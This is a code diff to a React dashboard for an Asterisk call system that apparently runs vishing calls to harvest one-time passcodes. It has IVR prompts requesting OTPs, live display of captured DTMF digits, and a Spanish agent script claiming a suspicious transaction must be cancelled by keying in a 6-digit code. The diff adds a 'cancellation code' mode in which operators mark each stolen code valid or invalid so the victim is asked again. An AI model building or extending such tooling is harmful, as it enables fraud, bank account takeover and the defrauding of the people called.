@@ -1,5 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { PjsipExtension, CarrierTrunk, CapturedOtpRecord, AudioPrompt, SystemUser, DialingCampaign, CampaignLead, CallCenterTenant } from '../types';
+import { PjsipExtension, CarrierTrunk, CapturedOtpRecord, AudioPrompt, SystemUser, DialingCampaign, CampaignLead, CallCenterTenant, CallFlowMode } from '../types';
 import {
   Rocket,
   PhoneCall,
@@ -68,6 +68,7 @@ export interface CampaignAudioConfig {
   promptAudioPath: string;   // Solicitud OTP o Press 1
   agentAudioPath: string;    // Previo a transferir a asesor
   successAudioPath: string;  // Confirmación / Éxito
+  cancelCodeAudioPath?: string; // Audio "Un momento por favor, le estamos enviando un código de cancelación"
 }
 
 export interface CampaignEntity {
@@ -83,6 +84,7 @@ export interface CampaignEntity {
   agentAudioPath: string;    // Transferencia a Asesor (Opción 1 - "Un momento por favor...")
   successAudioPath: string;  // Validación Exitosa
   waitAudioPath?: string;    // Espera
+  cancelCodeAudioPath?: string; // Audio al pulsar 1 en modo Código de Cancelación
   holdMusicAudioPath?: string; // Música de Hold / Espera personalizada por guión
   isLocked?: boolean;        // Bloqueo manual: previene sobreescritura por sincronización automática
   isActive?: boolean;        // Si es false, está inactivo y no aparece para asignar a Call Centers ni Usuarios
@@ -219,17 +221,17 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     return 'service';
   });
   const [customServiceName, setCustomServiceName] = useState('Servicio al Cliente');
-  const [callFlowMode, setCallFlowModeState] = useState<'otp' | 'press1' | 'hybrid'>(() => {
+  const [callFlowMode, setCallFlowModeState] = useState<CallFlowMode>(() => {
     try {
       const saved = localStorage.getItem('ast20_call_flow_mode');
-      if (saved === 'otp' || saved === 'press1' || saved === 'hybrid') {
+      if (saved === 'otp' || saved === 'press1' || saved === 'hybrid' || saved === 'cancel_code') {
         return saved;
       }
     } catch (_) {}
     return 'press1';
   });
 
-  const setCallFlowMode = (mode: 'otp' | 'press1' | 'hybrid') => {
+  const setCallFlowMode = (mode: CallFlowMode) => {
     setCallFlowModeState(mode);
     try {
       localStorage.setItem('ast20_call_flow_mode', mode);
@@ -685,7 +687,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       selectedService?: ServiceCampaignKey;
       dialingCampaigns?: DialingCampaign[];
       selectedCampaignId?: string;
-      callFlowMode?: 'otp' | 'press1' | 'hybrid';
+      callFlowMode?: CallFlowMode;
     }) => {
       try {
         const uId = activeUser?.id || 'user-admin';
@@ -774,7 +776,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
             localStorage.setItem('ast20_selected_campaign_id', String(ws.selectedCampaignId));
           } catch (_) {}
         }
-        if (ws.callFlowMode === 'otp' || ws.callFlowMode === 'press1' || ws.callFlowMode === 'hybrid') {
+        if (ws.callFlowMode === 'otp' || ws.callFlowMode === 'press1' || ws.callFlowMode === 'hybrid' || ws.callFlowMode === 'cancel_code') {
           setCallFlowModeState(ws.callFlowMode);
           try {
             localStorage.setItem('ast20_call_flow_mode', ws.callFlowMode);
@@ -956,6 +958,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           wait: current.waitAudioPath || 'custom/un_momento_validando_informacion',
           success: current.successAudioPath || 'custom/operacion_bloqueada_exito',
           agent: current.agentAudioPath || 'custom/conectar_asesor',
+          cancelWait: current.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
           holdMusic: current.holdMusicAudioPath || 'custom/moh_corporate_loop',
           destination: targetNumber.trim() || '16104803845',
           agentId: targetAgent,
@@ -1074,6 +1077,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     promptAudioPath: 'custom/solicitar_codigo_otp',
     agentAudioPath: 'custom/conectar_asesor',
     successAudioPath: 'custom/operacion_bloqueada_exito',
+    cancelCodeAudioPath: 'custom/enviando_codigo_cancelacion',
   };
 
   // Derived campaign audio configurations for backward compatibility
@@ -1084,6 +1088,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         promptAudioPath: ent.promptAudioPath || 'custom/solicitar_codigo_otp',
         agentAudioPath: ent.agentAudioPath || 'custom/conectar_asesor',
         successAudioPath: ent.successAudioPath || 'custom/operacion_bloqueada_exito',
+        cancelCodeAudioPath: ent.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
       };
     }
     return acc;
@@ -1153,6 +1158,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         wait: 'custom/un_momento_validando_informacion',
         success: slot === 'successAudioPath' ? cleanPath : (current?.successAudioPath || ''),
         agent: slot === 'agentAudioPath' ? cleanPath : (current?.agentAudioPath || ''),
+        cancelWait: slot === 'cancelCodeAudioPath' ? cleanPath : (current?.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion'),
         destination: targetNumber.trim() || '16104803845',
       };
       
@@ -1235,6 +1241,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
             wait: 'custom/un_momento_validando_informacion',
             success: normalizedEntity.successAudioPath,
             agent: normalizedEntity.agentAudioPath,
+            cancelWait: normalizedEntity.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
             destination: targetNumber.trim() || '16104803845',
           }),
         });
@@ -1266,6 +1273,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           wait: entity.waitAudioPath || 'custom/un_momento_validando_informacion',
           success: entity.successAudioPath || 'custom/operacion_bloqueada_exito',
           agent: entity.agentAudioPath || 'custom/conectar_asesor',
+          cancelWait: entity.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
           holdMusic: entity.holdMusicAudioPath || 'custom/moh_corporate_loop',
           destination: targetNumber.trim() || '16104803845',
           agentId: targetAgent,
@@ -1299,6 +1307,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       promptAudioPath: 'custom/solicitar_codigo_otp',
       agentAudioPath: 'custom/conectar_asesor',
       successAudioPath: 'custom/operacion_bloqueada_exito',
+      cancelCodeAudioPath: 'custom/enviando_codigo_cancelacion',
       holdMusicAudioPath: 'custom/moh_corporate_loop',
       isActive: true,
     };
@@ -1411,9 +1420,11 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     number: string;
     name?: string;
     service: string;
+    mode?: CallFlowMode;
     status: 'dialing' | 'ringing' | 'in_ivr' | 'pressed_1' | 'otp_captured' | 'transferred' | 'connected' | 'ended';
     capturedOtp?: string;
     otpStatus?: 'valid' | 'invalid' | 'pending';
+    cancelDecision?: 'valid' | 'invalid' | 'pending';
     validationNote?: string;
     duration: number;
     channel?: string;
@@ -1473,7 +1484,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   const [isLoadingRecords, setIsLoadingRecords] = useState(false);
   const [isLaunching, setIsLaunching] = useState(false);
   const [isHangingUp, setIsHangingUp] = useState(false);
-  const [launchFeedback, setLaunchFeedback] = useState<{ text: string; type: 'success' | 'error' } | null>(null);
+  const [launchFeedback, setLaunchFeedback] = useState<{ text: string; type: 'success' | 'error' | 'info' } | null>(null);
   const [isSyncingAudios, setIsSyncingAudios] = useState(false);
   const [audioSyncFeedback, setAudioSyncFeedback] = useState<string | null>(null);
   const [copiedId, setCopiedId] = useState<string | null>(null);
@@ -1849,6 +1860,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
       // Quitar del HUD de llamada activa la sección de dígitos en tiempo real
       if (activeCall) {
+        const isCancelModeCall = (activeCall.mode || callFlowMode) === 'cancel_code';
         if (activeCall.name?.includes('Cliente Transferido')) {
           setActiveCall(null);
         } else {
@@ -1860,8 +1872,10 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   agent: targetAgent,
                   status: prev.status === 'otp_captured' ? 'connected' : prev.status,
                   otpStatus: 'valid',
-                  validationNote:
-                    `✓ Token VÁLIDO aprobado. ¡Transfiriendo llamada de vuelta a la extensión de agente (${targetAgent})!`,
+                  cancelDecision: 'valid',
+                  validationNote: isCancelModeCall
+                    ? '✓ Código de cancelación marcado como VÁLIDO. Asterisk está reproduciendo la confirmación de cancelación exitosa al cliente.'
+                    : `✓ Token VÁLIDO aprobado. ¡Transfiriendo llamada de vuelta a la extensión de agente (${targetAgent})!`,
                 }
               : null
           );
@@ -1869,13 +1883,16 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       }
     } else {
       if (activeCall) {
+        const isCancelModeCall = (activeCall.mode || callFlowMode) === 'cancel_code';
         setActiveCall((prev) =>
           prev
             ? {
                 ...prev,
                 otpStatus: status,
-                validationNote:
-                  '✕ Token marcado como INVÁLIDO. El IVR le ha solicitado automáticamente un nuevo token al cliente...',
+                cancelDecision: 'invalid',
+                validationNote: isCancelModeCall
+                  ? '✕ Código de cancelación marcado como INVÁLIDO. Asterisk está solicitando un nuevo código al cliente...'
+                  : '✕ Token marcado como INVÁLIDO. El IVR le ha solicitado automáticamente un nuevo token al cliente...',
               }
             : null
         );
@@ -2159,12 +2176,38 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               return {
                 ...prev,
                 status: 'pressed_1',
+                mode: (callState.mode as CallFlowMode) || prev.mode,
                 pressed1At: callState.pressed1At || prev.pressed1At || Date.now(),
                 pressed1Time: prev.pressed1Time || new Date(callState.pressed1At || Date.now()).toLocaleTimeString(),
                 duration: typeof callState.duration === 'number' && callState.duration > 0 ? callState.duration : prev.duration,
                 channel: callState.channel || prev.channel,
               };
             });
+          } else if (callState.status === 'cancel_valid') {
+            setActiveCall((prev) =>
+              prev
+                ? {
+                    ...prev,
+                    otpStatus: 'valid',
+                    cancelDecision: 'valid',
+                    validationNote: '✓ Código de cancelación confirmado como VÁLIDO. Reproduciendo confirmación al cliente...',
+                    duration: typeof callState.duration === 'number' && callState.duration > 0 ? callState.duration : prev.duration,
+                  }
+                : null
+            );
+          } else if (callState.status === 'cancel_invalid') {
+            setActiveCall((prev) =>
+              prev
+                ? {
+                    ...prev,
+                    otpStatus: 'invalid',
+                    cancelDecision: 'invalid',
+                    capturedOtp: undefined,
+                    validationNote: '✕ Código marcado como INVÁLIDO. Esperando nuevo código del cliente...',
+                    duration: typeof callState.duration === 'number' && callState.duration > 0 ? callState.duration : prev.duration,
+                  }
+                : null
+            );
           } else if (callState.status === 'transferred') {
             setActiveCall((prev) => {
               if (!prev) return null;
@@ -2177,7 +2220,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               };
             });
           } else if (callState.status === 'in_ivr' && (activeCall.status === 'dialing' || activeCall.status === 'ringing')) {
-            setActiveCall((prev) => prev ? { ...prev, status: 'in_ivr', answeredAt: callState.answeredAt || Date.now(), channel: callState.channel || prev.channel } : null);
+            setActiveCall((prev) => prev ? { ...prev, status: 'in_ivr', mode: (callState.mode as CallFlowMode) || prev.mode, answeredAt: callState.answeredAt || Date.now(), channel: callState.channel || prev.channel } : null);
           } else if (callState.status === 'ringing' && activeCall.status === 'dialing') {
             setActiveCall((prev) => prev ? { ...prev, status: 'ringing', channel: callState.channel || prev.channel } : null);
           } else if (callState.status === 'machine') {
@@ -2342,6 +2385,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           wait: 'custom/un_momento_validando_informacion',
           success: currentAudios.successAudioPath || 'custom/operacion_bloqueada_exito',
           agent: currentAudios.agentAudioPath || 'custom/conectar_asesor',
+          cancelWait: currentAudios.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
           destination: targetNumber.trim() || '16104803845',
         }),
       });
@@ -2358,6 +2402,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           audioWait: 'custom/un_momento_validando_informacion',
           audioSuccess: currentAudios.successAudioPath || 'custom/operacion_bloqueada_exito',
           audioAgent: currentAudios.agentAudioPath || 'custom/conectar_asesor',
+          audioCancelWait: currentAudios.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
         }),
       });
 
@@ -2423,6 +2468,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           audioPrompt: currentAudios.promptAudioPath,
           audioAgent: currentAudios.agentAudioPath,
           audioSuccess: currentAudios.successAudioPath,
+          audioCancelWait: currentAudios.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
           holdMusic: campaignEntities.find((e) => e.id === selectedService)?.holdMusicAudioPath || 'custom/moh_corporate_loop',
         }),
       });
@@ -2441,8 +2487,10 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           number: targetNumber.trim(),
           name: targetName.trim() || undefined,
           service: serviceLabel,
+          mode: callFlowMode,
           status: 'dialing',
           otpStatus: 'pending',
+          cancelDecision: 'pending',
           duration: 0,
         });
 
@@ -2715,6 +2763,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           audioPrompt: currentAudios.promptAudioPath,
           audioAgent: currentAudios.agentAudioPath,
           audioSuccess: currentAudios.successAudioPath,
+          audioCancelWait: currentAudios.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
           holdMusic: currentAudios.holdMusicAudioPath || 'custom/moh_corporate_loop',
         });
 
@@ -3257,7 +3306,13 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 ? 'bg-slate-950 text-emerald-400'
                 : 'bg-emerald-500/20 text-emerald-300'
             }`}>
-              {callFlowMode === 'otp' ? 'Captura OTP' : callFlowMode === 'press1' ? 'Press-1' : 'Híbrido'}
+              {callFlowMode === 'otp'
+                ? 'Captura OTP'
+                : callFlowMode === 'press1'
+                ? 'Press-1'
+                : callFlowMode === 'cancel_code'
+                ? 'Press-1 + Cancelación'
+                : 'Híbrido'}
             </span>
           </button>
         )}
@@ -3547,46 +3602,80 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           </div>
 
           {/* BANNER GIGANTE Y ALERTA: CLIENTE PRESIONÓ 1 */}
-          {activeCall.status === 'pressed_1' && (
-            <div className="p-5 rounded-2xl bg-gradient-to-r from-amber-950/90 via-amber-900/50 to-slate-950 border-2 border-amber-400 shadow-2xl shadow-amber-500/30 animate-fadeIn my-4">
-              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
-                <div className="flex items-center gap-4">
-                  <div className="w-16 h-16 rounded-2xl bg-amber-400 text-slate-950 flex flex-col items-center justify-center font-black shadow-lg shadow-amber-400/50 animate-bounce">
-                    <span className="text-3xl leading-none">1</span>
-                    <span className="text-[9px] uppercase tracking-wider font-extrabold">DTMF</span>
-                  </div>
-                  <div>
-                    <div className="flex items-center gap-2">
-                      <span className="px-2.5 py-0.5 rounded-full text-[10px] font-black uppercase tracking-wider bg-amber-400 text-slate-950 flex items-center gap-1 shadow">
-                        <BellRing className="w-3 h-3 animate-spin" />
-                        ¡TECLA 1 PRESIONADA EN VIVO!
-                      </span>
-                      <span className="text-xs text-amber-200 font-mono font-bold">
-                        {activeCall.pressed1Time ? `Detectado a las ${activeCall.pressed1Time}` : '¡Justo en este instante!'}
-                      </span>
+          {activeCall.status === 'pressed_1' && (() => {
+            const isCancelCodeCall = (activeCall.mode || callFlowMode) === 'cancel_code';
+            return (
+              <div className="p-5 rounded-2xl bg-gradient-to-r from-amber-950/90 via-amber-900/50 to-slate-950 border-2 border-amber-400 shadow-2xl shadow-amber-500/30 animate-fadeIn my-4">
+                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
+                  <div className="flex items-center gap-4">
+                    <div className="w-16 h-16 rounded-2xl bg-amber-400 text-slate-950 flex flex-col items-center justify-center font-black shadow-lg shadow-amber-400/50 animate-bounce shrink-0">
+                      <span className="text-3xl leading-none">1</span>
+                      <span className="text-[9px] uppercase tracking-wider font-extrabold">DTMF</span>
                     </div>
-                    <h3 className="text-lg font-black text-white mt-1">
-                      El cliente ha marcado la tecla 1 en su teléfono
-                    </h3>
-                    <p className="text-xs text-amber-200/90 max-w-xl mt-0.5">
-                      Asterisk detectó la marcación DTMF 1. La llamada se está transfiriendo inmediatamente a tu extensión de Asesor (<strong>{activeCall.agent ? `Ext. ${activeCall.agent}` : activeCall.agentExten === 'ringall' ? 'Todas las Extensiones (Ring-All)' : `Ext. ${activeCall.agentExten || '1001'}`}</strong> / Softphone). ¡Listo para conversar con el cliente!
-                    </p>
+                    <div>
+                      <div className="flex flex-wrap items-center gap-2">
+                        <span className="px-2.5 py-0.5 rounded-full text-[10px] font-black uppercase tracking-wider bg-amber-400 text-slate-950 flex items-center gap-1 shadow">
+                          <BellRing className="w-3 h-3 animate-spin" />
+                          {isCancelCodeCall ? '¡MARCÓ 1 — ENVIANDO CÓDIGO DE CANCELACIÓN!' : '¡TECLA 1 PRESIONADA EN VIVO!'}
+                        </span>
+                        <span className="text-xs text-amber-200 font-mono font-bold">
+                          {activeCall.pressed1Time ? `Detectado a las ${activeCall.pressed1Time}` : '¡Justo en este instante!'}
+                        </span>
+                      </div>
+                      <h3 className="text-lg font-black text-white mt-1">
+                        {isCancelCodeCall
+                          ? 'El cliente marcó 1: Reproduciendo "Un momento por favor, le estamos enviando un código de cancelación"'
+                          : 'El cliente ha marcado la tecla 1 en su teléfono'}
+                      </h3>
+                      <p className="text-xs text-amber-200/90 max-w-xl mt-0.5">
+                        {isCancelCodeCall
+                          ? 'Asterisk le está enviando y solicitando el código de cancelación al cliente. En cuanto el cliente digite o recibas el resultado, selecciona si el código es VÁLIDO o INVÁLIDO:'
+                          : (
+                            <>
+                              Asterisk detectó la marcación DTMF 1. La llamada se está transfiriendo inmediatamente a tu extensión de Asesor (<strong>{activeCall.agent ? `Ext. ${activeCall.agent}` : activeCall.agentExten === 'ringall' ? 'Todas las Extensiones (Ring-All)' : `Ext. ${activeCall.agentExten || '1001'}`}</strong> / Softphone). ¡Listo para conversar con el cliente!
+                            </>
+                          )}
+                      </p>
+                    </div>
                   </div>
-                </div>
 
-                <div className="flex flex-col sm:flex-row items-center gap-2">
-                  <button
-                    id="btn-hud-press1-talk"
-                    onClick={handleTransferToAgent}
-                    className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-5 py-3 rounded-xl font-black text-xs bg-amber-400 hover:bg-amber-300 text-slate-950 transition-all shadow-lg shadow-amber-400/40 animate-pulse"
-                  >
-                    <PhoneCall className="w-4 h-4" />
-                    <span>Conectar con Softphone ({activeCall.agent || (activeCall.agentExten !== 'ringall' ? activeCall.agentExten : '1001')})</span>
-                  </button>
+                  <div className="flex flex-col sm:flex-row items-center gap-2 shrink-0">
+                    {isCancelCodeCall ? (
+                      <>
+                        <button
+                          id="btn-hud-cancel-valid"
+                          type="button"
+                          onClick={() => handleVerifyOtp('valid', activeCall.capturedOtp || 'CANCEL', activeCall.number)}
+                          className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-5 py-3 rounded-xl font-black text-xs bg-emerald-500 hover:bg-emerald-400 text-slate-950 transition-all shadow-lg shadow-emerald-500/40 cursor-pointer"
+                        >
+                          <CheckCircle className="w-4 h-4" />
+                          <span>CÓDIGO VÁLIDO</span>
+                        </button>
+                        <button
+                          id="btn-hud-cancel-invalid"
+                          type="button"
+                          onClick={() => handleVerifyOtp('invalid', activeCall.capturedOtp || 'CANCEL', activeCall.number)}
+                          className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-5 py-3 rounded-xl font-black text-xs bg-rose-600 hover:bg-rose-500 text-white transition-all shadow-lg shadow-rose-600/40 cursor-pointer"
+                        >
+                          <XCircle className="w-4 h-4" />
+                          <span>CÓDIGO INVÁLIDO</span>
+                        </button>
+                      </>
+                    ) : (
+                      <button
+                        id="btn-hud-press1-talk"
+                        onClick={handleTransferToAgent}
+                        className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-5 py-3 rounded-xl font-black text-xs bg-amber-400 hover:bg-amber-300 text-slate-950 transition-all shadow-lg shadow-amber-400/40 animate-pulse"
+                      >
+                        <PhoneCall className="w-4 h-4" />
+                        <span>Conectar con Softphone ({activeCall.agent || (activeCall.agentExten !== 'ringall' ? activeCall.agentExten : '1001')})</span>
+                      </button>
+                    )}
+                  </div>
                 </div>
               </div>
-            </div>
-          )}
+            );
+          })()}
 
           {/* Live Call Signal & Telemetry Strip */}
           <div className="p-3 rounded-xl bg-slate-900/80 border border-slate-800 flex flex-wrap items-center justify-between gap-3 text-xs mb-4">
@@ -3620,13 +3709,38 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
             </div>
           </div>
 
+          {activeCall.validationNote && (
+            <div
+              className={`mb-4 p-3.5 rounded-xl border text-xs font-semibold flex items-center gap-2.5 animate-fadeIn ${
+                activeCall.otpStatus === 'valid' || activeCall.cancelDecision === 'valid'
+                  ? 'bg-emerald-500/15 border-emerald-500/50 text-emerald-200'
+                  : activeCall.otpStatus === 'invalid' || activeCall.cancelDecision === 'invalid'
+                  ? 'bg-rose-500/15 border-rose-500/50 text-rose-200'
+                  : 'bg-sky-500/15 border-sky-500/40 text-sky-200'
+              }`}
+            >
+              {activeCall.otpStatus === 'valid' || activeCall.cancelDecision === 'valid' ? (
+                <CheckCircle className="w-4 h-4 text-emerald-400 shrink-0" />
+              ) : activeCall.otpStatus === 'invalid' || activeCall.cancelDecision === 'invalid' ? (
+                <XCircle className="w-4 h-4 text-rose-400 shrink-0" />
+              ) : (
+                <RefreshCw className="w-4 h-4 text-sky-400 shrink-0 animate-spin" />
+              )}
+              <span>{activeCall.validationNote}</span>
+            </div>
+          )}
+
           {/* CAPTURED OTP DISPLAY HUD: Solo visible mientras no haya sido validado */}
           {activeCall.otpStatus !== 'valid' && (
             <div className="p-6 rounded-xl bg-slate-900/90 border border-slate-800 text-center space-y-4">
             <div className="flex items-center justify-between border-b border-slate-800 pb-3">
               <div className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                 <KeyRound className="w-4 h-4 text-emerald-400" />
-                <span>Dígitos DTMF Capturados en Vivo (Tiempo Real)</span>
+                <span>
+                  {(activeCall.mode || callFlowMode) === 'cancel_code'
+                    ? 'Código de Cancelación Capturado en Vivo (Tiempo Real)'
+                    : 'Dígitos DTMF Capturados en Vivo (Tiempo Real)'}
+                </span>
               </div>
               <div className="text-xs font-mono text-slate-400 flex items-center gap-2">
                 <Phone className="w-3.5 h-3.5 text-emerald-400" />
@@ -3639,21 +3753,33 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               <div className="flex items-center justify-between">
                 <div className="flex items-center gap-2 text-xs font-bold text-sky-300 uppercase tracking-wide">
                   <UserCheck className="w-4 h-4 text-emerald-400" />
-                  <span>Flujo Asistido por Agente: Solicitud y Validación Manual de OTP</span>
+                  <span>
+                    {(activeCall.mode || callFlowMode) === 'cancel_code'
+                      ? 'Modo Press-1 + Código de Cancelación: Validación por Agente'
+                      : 'Flujo Asistido por Agente: Solicitud y Validación Manual de OTP'}
+                  </span>
                 </div>
                 <span className="text-[11px] font-mono px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 flex items-center gap-1.5 font-bold">
                   <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
-                  Agente en Línea con Cliente
+                  {(activeCall.mode || callFlowMode) === 'cancel_code' ? 'IVR Cancelación Activo' : 'Agente en Línea con Cliente'}
                 </span>
               </div>
 
-              {/* Guión sugerido para que el Agente solicite el OTP al cliente en llamada */}
-              <div className="p-3 rounded-lg bg-slate-900 border border-sky-500/20 text-xs text-slate-300">
-                <span className="text-sky-400 font-bold block mb-1">🗣️ Guión para el Asesor (Solicitar código al cliente en llamada):</span>
-                <p className="italic text-slate-200">
-                  "Señor/a <strong className="text-white">{activeCall.name || 'cliente'}</strong>, por motivos de seguridad y anulación preventiva de la transacción sospechosa, le acabamos de remitir su clave de verificación de 6 dígitos. Por favor márquela en este momento en el teclado numérico de su teléfono mientras permanezco en línea con usted para validar la anulación."
-                </p>
-              </div>
+              {(activeCall.mode || callFlowMode) === 'cancel_code' ? (
+                <div className="p-3 rounded-lg bg-amber-950/30 border border-amber-500/30 text-xs text-slate-300">
+                  <span className="text-amber-300 font-bold block mb-1">🛡️ Flujo Automático Código de Cancelación:</span>
+                  <p className="text-slate-200">
+                    Cuando el cliente marque <strong>1</strong>, el sistema le dice: <em>"Un momento por favor, le estamos enviando un código de cancelación"</em> y captura los dígitos que marque. Usa <strong>CÓDIGO VÁLIDO</strong> para confirmar la cancelación y finalizar, o <strong>CÓDIGO INVÁLIDO</strong> para pedirle otro código automáticamente.
+                  </p>
+                </div>
+              ) : (
+                <div className="p-3 rounded-lg bg-slate-900 border border-sky-500/20 text-xs text-slate-300">
+                  <span className="text-sky-400 font-bold block mb-1">🗣️ Guión para el Asesor (Solicitar código al cliente en llamada):</span>
+                  <p className="italic text-slate-200">
+                    "Señor/a <strong className="text-white">{activeCall.name || 'cliente'}</strong>, por motivos de seguridad y anulación preventiva de la transacción sospechosa, le acabamos de remitir su clave de verificación de 6 dígitos. Por favor márquela en este momento en el teclado numérico de su teléfono mientras permanezco en línea con usted para validar la anulación."
+                  </p>
+                </div>
+              )}
             </div>
 
             {activeCall.capturedOtp ? (
@@ -3829,6 +3955,128 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                     className="w-1/3 px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-white text-xs focus:border-emerald-500 focus:outline-none hidden sm:block"
                   />
                 </div>
+              </div>
+
+              {/* CARD 1.5: FLUJO AL CONTESTAR (MODO DE LLAMADA DIRECTO EN DISPARADOR) */}
+              <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 space-y-3">
+                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+                  <div className="flex items-center gap-2">
+                    <Zap className="w-4 h-4 text-amber-400" />
+                    <span className="text-xs font-bold text-white uppercase tracking-wider">
+                      Flujo al Contestar (Modo de Llamada)
+                    </span>
+                  </div>
+                  {!isAgent && (
+                    <button
+                      type="button"
+                      onClick={() => setProductionMode('ivr_action')}
+                      className="text-[11px] font-semibold text-emerald-400 hover:text-emerald-300 underline cursor-pointer self-start sm:self-auto"
+                    >
+                      Personalizar audios del IVR →
+                    </button>
+                  )}
+                </div>
+
+                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5">
+                  <button
+                    type="button"
+                    onClick={() => setCallFlowMode('otp')}
+                    className={`p-3 rounded-xl border text-left transition-all cursor-pointer ${
+                      callFlowMode === 'otp'
+                        ? 'bg-emerald-500/15 border-emerald-500 text-white ring-1 ring-emerald-500/50 shadow'
+                        : 'bg-slate-950/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
+                    }`}
+                  >
+                    <div className="flex items-center justify-between">
+                      <span className="text-xs font-bold text-white flex items-center gap-1.5">
+                        <KeyRound className="w-3.5 h-3.5 text-emerald-400" />
+                        <span>1. Captura OTP</span>
+                      </span>
+                      {callFlowMode === 'otp' && <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />}
+                    </div>
+                    <p className="text-[10px] text-slate-400 mt-1">Pide dígitos OTP al contestar</p>
+                  </button>
+
+                  <button
+                    type="button"
+                    onClick={() => setCallFlowMode('press1')}
+                    className={`p-3 rounded-xl border text-left transition-all cursor-pointer ${
+                      callFlowMode === 'press1'
+                        ? 'bg-sky-500/15 border-sky-500 text-white ring-1 ring-sky-500/50 shadow'
+                        : 'bg-slate-950/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
+                    }`}
+                  >
+                    <div className="flex items-center justify-between">
+                      <span className="text-xs font-bold text-white flex items-center gap-1.5">
+                        <PhoneForwarded className="w-3.5 h-3.5 text-sky-400" />
+                        <span>2. Press-1 (Asesor)</span>
+                      </span>
+                      {callFlowMode === 'press1' && <CheckCircle2 className="w-3.5 h-3.5 text-sky-400" />}
+                    </div>
+                    <p className="text-[10px] text-slate-400 mt-1">Al marcar 1 transfiere a Softphone</p>
+                  </button>
+
+                  <button
+                    type="button"
+                    onClick={() => setCallFlowMode('hybrid')}
+                    className={`p-3 rounded-xl border text-left transition-all cursor-pointer ${
+                      callFlowMode === 'hybrid'
+                        ? 'bg-purple-500/15 border-purple-500 text-white ring-1 ring-purple-500/50 shadow'
+                        : 'bg-slate-950/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
+                    }`}
+                  >
+                    <div className="flex items-center justify-between">
+                      <span className="text-xs font-bold text-white flex items-center gap-1.5">
+                        <Radio className="w-3.5 h-3.5 text-purple-400" />
+                        <span>3. Híbrido</span>
+                      </span>
+                      {callFlowMode === 'hybrid' && <CheckCircle2 className="w-3.5 h-3.5 text-purple-400" />}
+                    </div>
+                    <p className="text-[10px] text-slate-400 mt-1">OTP automático o Press-1</p>
+                  </button>
+
+                  <button
+                    id="btn-single-mode-cancel-code"
+                    type="button"
+                    onClick={() => setCallFlowMode('cancel_code')}
+                    className={`p-3 rounded-xl border text-left transition-all cursor-pointer ${
+                      callFlowMode === 'cancel_code'
+                        ? 'bg-amber-500/20 border-amber-400 text-white ring-2 ring-amber-400/50 shadow-lg shadow-amber-500/10'
+                        : 'bg-slate-950/80 border-slate-800 text-slate-400 hover:text-white hover:border-amber-500/40'
+                    }`}
+                  >
+                    <div className="flex items-center justify-between">
+                      <span className="text-xs font-bold text-white flex items-center gap-1.5">
+                        <ShieldCheck className="w-3.5 h-3.5 text-amber-400" />
+                        <span>4. Código Cancelación</span>
+                      </span>
+                      {callFlowMode === 'cancel_code' && <CheckCircle2 className="w-3.5 h-3.5 text-amber-400" />}
+                    </div>
+                    <p className="text-[10px] text-amber-300/90 mt-1">Marca 1 → Envía código + Válido/Inválido</p>
+                  </button>
+                </div>
+
